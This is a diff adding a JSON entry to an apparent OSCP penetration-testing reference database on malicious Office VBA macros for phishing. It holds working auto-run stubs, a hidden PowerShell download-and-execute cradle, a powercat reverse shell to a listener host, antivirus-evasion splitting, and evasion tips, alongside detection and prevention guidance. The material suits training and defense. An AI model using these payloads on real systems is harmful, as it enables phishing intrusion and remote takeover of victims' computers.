@@ -1,0 +1,107 @@
+{
+  "id": "office-macro-payload",
+  "name": "Office - Malicious VBA Macro",
+  "command": "Sub AutoOpen()\n    MyMacro\nEnd Sub\nSub Document_Open()\n    MyMacro\nEnd Sub",
+  "description": "Classic client-side phishing vector: embed a VBA macro in a Word document that fires on open (AutoOpen / Document_Open) and runs a PowerShell download-and-execute cradle. The document must be saved as the macro-enabled legacy .doc (Word 97-2003) so the macro survives, then delivered to a user who clicks 'Enable Content' past Protected View.",
+  "type": "payload",
+  "platform": "windows",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "office",
+    "powershell"
+  ],
+  "tags": [
+    "client-side",
+    "phishing",
+    "macro",
+    "vba",
+    "office",
+    "powershell"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Client-Side Attacks",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 11: Client-Side Attacks",
+  "examples": [
+    {
+      "label": "VBA auto-run stubs",
+      "command": "Sub AutoOpen()\n    MyMacro\nEnd Sub\nSub Document_Open()\n    MyMacro\nEnd Sub"
+    },
+    {
+      "label": "PowerShell download-exec inside the macro",
+      "command": "Str = \"powershell -nop -w hidden -c \"\"IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.128/run.ps1')\"\"\"\nGetObject(\"winmgmts:\").Get(\"Win32_Process\").Create Str, Null, Null, pid"
+    },
+    {
+      "label": "Python helper: split a base64 PS command into VBA Str lines (run on Kali)",
+      "command": "python3 -c \"\nimport sys\ns = open(sys.argv[1]).read().strip()\nn = 50\nfor i in range(0, len(s), n):\n    print('    Str = Str + ' + chr(34) + s[i:i+n] + chr(34))\n\" payload.txt"
+    },
+    {
+      "label": "Simple exec variant — WScript.Shell instead of WMI (less evasion, easier to understand)",
+      "command": "Sub MyMacro()\n    CreateObject(\"Wscript.Shell\").Run \"powershell\"\nEnd Sub\n' vs WMI exec (harder to detect):\n' GetObject(\"winmgmts:\").Get(\"Win32_Process\").Create Str, Null, Null, pid"
+    },
+    {
+      "label": "Chapter-canonical powercat payload — encode this and split into Str lines for the macro",
+      "command": "IEX(New-Object System.Net.WebClient).DownloadString('http://<lhost>/powercat.ps1');powercat -c <lhost> -p 4444 -e powershell\n# 1. Base64-encode on Kali:  echo -n '<above>' | iconv -t UTF-16LE | base64 -w 0\n# 2. Wrap: powershell.exe -nop -w hidden -e <base64>\n# 3. Run python helper to split into Str = Str + \"...\" lines\n# 4. Paste into Sub MyMacro() Dim Str As String block"
+    }
+  ],
+  "notes": "Split the PowerShell string across VBA variables (Str = Str + \"...\") to defeat trivial AV string matching. AutoOpen fires when the doc opens; Document_Open covers the template context - include both. The file MUST be saved as .doc (or .docm); a plain .docx cannot store macros. Delivery still depends on the user clicking Enable Content, so pretext matters. Pair with client-recon-fingerprint to confirm the target actually runs Office before sending.",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Client-Side Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "Red Team Notes - Phishing with MS Office",
+      "url": "https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "client-recon-fingerprint",
+      "rel": "prereq",
+      "note": "Fingerprint the target OS/Office version before crafting the macro payload."
+    },
+    {
+      "id": "hta-mshta-attack",
+      "rel": "alternative",
+      "note": "If the target opens links in a browser rather than Office docs, deliver an .hta instead."
+    },
+    {
+      "id": "library-ms-webdav-attack",
+      "rel": "alternative",
+      "note": "No-macro alternative when Office macro execution policy is enforced."
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1566.001",
+    "T1204.002",
+    "T1059.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Microsoft Office macro (VBA) code executes within the Office process with the user's privileges. Macros can call WinAPI functions directly or invoke PowerShell via Shell/WScript.Shell to download and execute payloads. Auto-execution macros (AutoOpen, AutoExec, Document_Open) trigger when a document is opened. Delivered via phishing, exploiting trust in Office documents and the user's desire to 'Enable Content' when prompted.",
+    "prerequisites": "Target opens the malicious Office document and clicks 'Enable Macros' (or macro execution is policy-enabled). Office application installed. Network connectivity for payload download. VBA macros not blocked by Trust Center policies.",
+    "impact": "T1566.001 Phishing: Spearphishing Attachment + T1204.002 User Execution: Malicious File + T1059.001 PowerShell. Initial access via malicious document \u2014 one of the most common initial access vectors. VBA can invoke PowerShell for in-memory payload execution, download-and-execute additional stages, or directly call WinAPI.",
+    "detection": "Sysmon Event 1: WINWORD.EXE/EXCEL.EXE spawning PowerShell, cmd.exe, wscript, mshta. Event 4688: Office process spawning non-Office children. ASR rule alerts: Office macro creating child process. EDR: VBA calling WinAPI pattern. Email gateway: malicious macro detection. AMSI: PowerShell payload from macro caught by AMSI.\nUnusual inbound email with attachments or URLs followed by new process execution or suspicious document behavior; correlate email metadata, file creation, and network activity (DET0070/AN0188).\nMail logs with suspicious file writes or outbound connections after email delivery (AN0189).\nMac Mail app anomalies: attachments saved and immediately executed, or Safari/Preview launching files from email (AN0190).\nOffice documents with macros spawning child processes; correlate Office logs with execution and network connections (AN0191).\nAnomalous IdP login attempts from suspicious email invitations or fake SSO prompts; correlate with MFA bypass and geo anomalies (AN0192).\nSaaS-delivered phishing (chat/collaboration): anomalous link clicks, suspicious uploads, token misuse after delivery (AN0193).",
+    "artifacts": "Sysmon Event 1: WINWORD.EXE \u2192 powershell.exe/cmd.exe | Event 4688: Office spawning shells | ASR audit/block event | AMSI block event | Email gateway: macro in attachment flagged | EDR: VBA WinAPI call alert",
+    "prevention": "Disable macros in Office via GPO: User Config \u2192 Admin Templates \u2192 Microsoft Word/Excel \u2192 Trust Center \u2192 Macro Settings \u2192 Disable all macros without notification. ASR rule: 'Block Office macros from creating child processes' (Defender). Email gateway: scan for macros in Office attachments. Microsoft 365 safe attachments: detonates attachments in sandbox. Enable Protected View (opens downloaded files read-only). Require trusted publisher signatures for macros.\nAntivirus/Antimalware: Auto-quarantine suspicious files.\nAudit: Scan systems and configurations for weaknesses.\nNetwork Intrusion Prevention: Use NIP systems to scan and block malicious email attachments or links.\nRestrict Web-Based Content: Block access to websites or attachment types (.scr, .exe, .pif, .cpl) used for phishing if not needed for business.\nSoftware Configuration: Use anti-spoofing/email authentication (SPF, DKIM, DMARC) to filter messages based on sender domain validity and message integrity.\nUser Training: Train users to identify social engineering techniques and phishing emails.",
+    "evasion": "Use Excel 4.0 (XLM) macros instead of VBA \u2014 different detection path. Use Office macro to create a scheduled task or registry run key rather than spawning a child process directly (bypasses child-process ASR rules). Sign macro with a stolen code signing cert.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1566/001/",
+      "https://attack.mitre.org/techniques/T1204/002/",
+      "https://attack.mitre.org/techniques/T1059/001/"
+    ],
+    "misconfiguration": "Office macros not disabled by GPO. ASR child process rule not enabled. Email gateway doesn't inspect macro content. Protected View disabled for network/internet locations.",
+    "vulnerable_config": "# Macros enabled in Trust Center:\n# User Config \u2192 Admin Templates \u2192 Microsoft Office 2016 \u2192 Security Settings \u2192 Trust Center\n# \u2192 Macro Settings: Enable all macros = CRITICAL\n\n# Protected View disabled:\n# Trust Center \u2192 Protected View: all options unchecked\n# \u2192 Files from internet open directly in edit mode = macros auto-execute",
+    "secure_config": "# Disable macros via GPO:\n# User Config \u2192 Admin Templates \u2192 Microsoft Office \u2192 Trust Center \u2192 Macro Settings\n# \u2192 Disable VBA macros without notification: Enabled\n\n# ASR rules:\nSet-MpPreference -AttackSurfaceReductionRules_Ids @(\n  '2B5223F8-AC7F-4C4E-B2BD-69ECC11D8FE4',  # Office: block child process creation\n  '3B576869-A4EC-4529-8536-B80A7769E899',  # Office: block executable content\n  '75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84'   # Office: block process injection\n) -AttackSurfaceReductionRules_Actions @('Enabled','Enabled','Enabled')\n\n# Block macro-containing attachments at email gateway"
+  }
+}
